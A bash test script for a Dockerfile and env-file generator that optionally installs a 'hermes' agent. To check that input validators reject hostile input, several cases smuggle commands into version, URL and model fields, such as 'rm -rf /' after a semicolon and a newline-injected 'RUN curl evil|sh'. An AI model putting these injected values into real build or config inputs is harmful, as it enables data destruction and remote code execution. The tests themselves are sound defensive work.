#!/usr/bin/env bash
set -euo pipefail

INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMPBASE="$(mktemp -d)"
trap 'rm -rf "$TMPBASE"' EXIT

_fail() {
  echo "FAIL: $1" >&2
  exit 1
}

_ok() {
  echo "ok: $1"
}

_render_dockerfile() {
  local outdir="$1" hermes="$2" version="$3"
  mkdir -p "$outdir"
  (
    INSTALL_DIR="$INSTALL_DIR"
    export INSTALL_DIR
    export HOME="/home/x"
    export CBOX_WORKSPACES="/zerolab/agent_ecosystem"
    export CBOX_HERMES="$hermes"
    export CBOX_HERMES_VERSION="$version"
    source "$INSTALL_DIR/_common.sh"
    source "$INSTALL_DIR/templates/generators.sh"
    gen_dockerfile_into "$outdir" "sha256:deadbeef"
  )
}

BASE="$TMPBASE/base"
_render_dockerfile "$BASE" off ""
[ -f "$BASE/Dockerfile" ] || _fail "baseline Dockerfile (hermes off) not written"
! grep -q hermes "$BASE/Dockerfile" || _fail "hermes off but Dockerfile mentions hermes:
$(cat "$BASE/Dockerfile")"
_ok "hermes off: Dockerfile has no hermes strings"

ON="$TMPBASE/on"
_render_dockerfile "$ON" on "0.19.0"
grep -q 'python3 -m venv /opt/hermes' "$ON/Dockerfile" || _fail "hermes on but venv RUN line missing"
grep -q 'hermes-agent==0.19.0' "$ON/Dockerfile" || _fail "hermes on but pinned pip install missing"
grep -q 'ln -s /opt/hermes/bin/hermes /usr/local/bin/hermes' "$ON/Dockerfile" || _fail "hermes on but symlink missing"
_ok "hermes on: Dockerfile has pinned venv install block"

DIFF_BASE="$TMPBASE/diffbase"
_render_dockerfile "$DIFF_BASE" off ""
diff -q "$BASE/Dockerfile" "$DIFF_BASE/Dockerfile" >/dev/null \
  || _fail "Dockerfile with hermes off is not byte-identical across renders"
_ok "hermes off: Dockerfile is byte-identical to the baseline render"

BAD="$TMPBASE/bad"
mkdir -p "$BAD"
if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_WORKSPACES="/zerolab/agent_ecosystem"
  export CBOX_HERMES=on
  export CBOX_HERMES_VERSION="not-a-version; rm -rf /"
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_dockerfile_into "$BAD" "sha256:deadbeef"
) 2>/dev/null; then
  _fail "gen_dockerfile_into accepted a malformed CBOX_HERMES_VERSION"
fi
_ok "hermes on: bad version pin grammar dies loudly"

M1="$TMPBASE/m1/managed.env"
mkdir -p "$(dirname "$M1")"
(
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=local
  export CBOX_HERMES_MODEL_URL=http://127.0.0.1:11434
  export CBOX_HERMES_MODEL_NAME=qwen2.5:7b
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_hermes_managed_into "$M1"
)
grep -q '^HERMES_MANAGED_PROVIDER=local$' "$M1" || _fail "local provider line missing/wrong in $M1:
$(cat "$M1")"
grep -q '^HERMES_MANAGED_BASE_URL=http://127.0.0.1:11434/v1$' "$M1" \
  || _fail "local provider url without /v1 did not get /v1 appended:
$(cat "$M1")"
grep -q '^HERMES_MANAGED_MODEL=qwen2.5:7b$' "$M1" || _fail "model line missing/wrong in $M1:
$(cat "$M1")"
_ok "gen_hermes_managed_into: local provider url without /v1 gets /v1 appended"

M2="$TMPBASE/m2/managed.env"
mkdir -p "$(dirname "$M2")"
(
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=openai
  export CBOX_HERMES_MODEL_URL=""
  export CBOX_HERMES_MODEL_NAME=gpt-5
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_hermes_managed_into "$M2"
)
grep -q '^HERMES_MANAGED_PROVIDER=openai$' "$M2" || _fail "hosted provider line missing/wrong in $M2:
$(cat "$M2")"
! grep -q '^HERMES_MANAGED_BASE_URL=' "$M2" || _fail "hosted provider must omit base_url line:
$(cat "$M2")"
_ok "gen_hermes_managed_into: hosted provider omits base_url"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=local
  export CBOX_HERMES_MODEL_URL='http://x/v1; rm -rf /'
  export CBOX_HERMES_MODEL_NAME=qwen
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_hermes_managed_into "$TMPBASE/m3/managed.env"
) 2>/dev/null; then
  _fail "gen_hermes_managed_into accepted a hostile CBOX_HERMES_MODEL_URL"
fi
_ok "gen_hermes_managed_into: hostile url value rejected"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=local
  export CBOX_HERMES_MODEL_URL=""
  export CBOX_HERMES_MODEL_NAME='qwen; rm -rf /'
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_hermes_managed_into "$TMPBASE/m4/managed.env"
) 2>/dev/null; then
  _fail "gen_hermes_managed_into accepted a hostile CBOX_HERMES_MODEL_NAME"
fi
_ok "gen_hermes_managed_into: hostile model value rejected"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES=on
  export CBOX_HERMES_VERSION="$(printf '0.19.0\nRUN curl evil|sh')"
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_dockerfile_into "$TMPBASE/m5" "sha256:deadbeef"
) 2>/dev/null; then
  _fail "gen_dockerfile_into accepted a newline-smuggled CBOX_HERMES_VERSION"
fi
_ok "gen_dockerfile_into: newline-smuggled version pin rejected"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=local
  export CBOX_HERMES_MODEL_URL="$(printf 'http://good.example/v1\n      - EVIL=1')"
  export CBOX_HERMES_MODEL_NAME=qwen
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_hermes_managed_into "$TMPBASE/m6/managed.env"
) 2>/dev/null; then
  _fail "gen_hermes_managed_into accepted a newline-smuggled CBOX_HERMES_MODEL_URL"
fi
_ok "gen_hermes_managed_into: newline-smuggled url value rejected"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=local
  export CBOX_HERMES_MODEL_URL=""
  export CBOX_HERMES_MODEL_NAME="$(printf 'qwen\nHERMES_MANAGED_PROVIDER=anthropic')"
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  gen_hermes_managed_into "$TMPBASE/m7/managed.env"
) 2>/dev/null; then
  _fail "gen_hermes_managed_into accepted a newline-smuggled CBOX_HERMES_MODEL_NAME"
fi
_ok "gen_hermes_managed_into: newline-smuggled model value rejected"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES=on
  export CBOX_HERMES_PROVIDER=openrouter
  export CBOX_HERMES_MODEL_URL="$(printf 'x\n      - EVIL=1')"
  export CBOX_HERMES_MODEL_NAME=""
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  _cbox_hermes_validate_compose_env
) 2>/dev/null; then
  _fail "_cbox_hermes_validate_compose_env accepted a newline-smuggled CBOX_HERMES_MODEL_URL for a hosted provider"
fi
_ok "_cbox_hermes_validate_compose_env: newline-smuggled url rejected for hosted provider (compose-injection guard)"

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=nous
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  _cbox_hermes_validate_provider "$CBOX_HERMES_PROVIDER"
); then
  _ok "_cbox_hermes_validate_provider: nous (Nous Portal) accepted"
else
  _fail "_cbox_hermes_validate_provider rejected 'nous'"
fi

if (
  INSTALL_DIR="$INSTALL_DIR"
  export INSTALL_DIR
  export HOME="/home/x"
  export CBOX_HERMES_PROVIDER=portal
  source "$INSTALL_DIR/_common.sh"
  source "$INSTALL_DIR/templates/generators.sh"
  _cbox_hermes_validate_provider "$CBOX_HERMES_PROVIDER"
) 2>/dev/null; then
  _fail "_cbox_hermes_validate_provider accepted stale 'portal' provider name"
fi
_ok "_cbox_hermes_validate_provider: stale 'portal' provider name rejected"

_image_inputs_hash() {
  local eff="$1" hermes="$2" version="$3"
  mkdir -p "$eff"
  : > "$eff/entrypoint.sh"
  : > "$eff/install-bins.sh"
  (
    INSTALL_DIR="$INSTALL_DIR"
    export INSTALL_DIR
    export HOME="/home/x"
    export CBOX_HERMES="$hermes"
    export CBOX_HERMES_VERSION="$version"
    source "$INSTALL_DIR/_common.sh"
    source "$INSTALL_DIR/templates/generators.sh"
    gen_image_inputs "$eff" "sha256:deadbeef"
  )
  sha256sum "$eff/image.inputs" | awk '{print $1}'
}

H_OFF="$(_image_inputs_hash "$TMPBASE/inputs_off" off "")"
H_ON="$(_image_inputs_hash "$TMPBASE/inputs_on" on "0.19.0")"
[ "$H_OFF" != "$H_ON" ] || _fail "image.inputs hash unchanged when toggling CBOX_HERMES on"
_ok "image.inputs: hash changes when hermes toggles on"

H_ON2="$(_image_inputs_hash "$TMPBASE/inputs_on2" on "0.20.0")"
[ "$H_ON" != "$H_ON2" ] || _fail "image.inputs hash unchanged when repinning CBOX_HERMES_VERSION"
_ok "image.inputs: hash changes when hermes version is repinned"

_validator_body() {
  local file="$1" fn="$2"
  awk -v fn="$fn" '
    $0 ~ "^" fn "\\(\\) \\{" { grab=1; next }
    grab && /^\}/ { exit }
    grab { print }
  ' "$file"
}

_cross_check_validator() {
  local name="$1" gen_fn="$2" entry_fn="$3"
  local gen_body entry_body
  gen_body="$(_validator_body "$INSTALL_DIR/templates/generators.sh" "$gen_fn")"
  entry_body="$(_validator_body "$INSTALL_DIR/entrypoint.sh" "$entry_fn")"
  [ -n "$gen_body" ] || _fail "textual-agreement: $gen_fn body not found in templates/generators.sh"
  [ -n "$entry_body" ] || _fail "textual-agreement: $entry_fn body not found in entrypoint.sh"
  [ "$gen_body" = "$entry_body" ] \
    || _fail "textual-agreement: $gen_fn (generators.sh) and $entry_fn (entrypoint.sh) have drifted:
--- $gen_fn ---
$gen_body
--- $entry_fn ---
$entry_body"
  _ok "textual-agreement: $gen_fn and $entry_fn stay in sync ($name)"
}

_cross_check_validator "url"      _cbox_hermes_validate_url      _hermes_validate_url
_cross_check_validator "model"    _cbox_hermes_validate_model    _hermes_validate_model
_cross_check_validator "provider" _cbox_hermes_validate_provider _hermes_validate_provider

echo "PASS: all hermes_gen checks"
